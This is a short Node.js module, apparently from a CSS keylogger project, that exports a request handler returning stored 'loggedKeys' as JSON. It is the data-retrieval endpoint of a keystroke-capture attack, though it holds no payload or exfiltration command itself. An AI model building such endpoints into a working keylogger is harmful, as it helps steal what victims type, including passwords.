const { loggedKeys } = require("./keyloggerParams");

const cssKeyLoggerGetKeysHandler = async (req, res) => {
  res.json(loggedKeys);
};

module.exports = cssKeyLoggerGetKeysHandler;
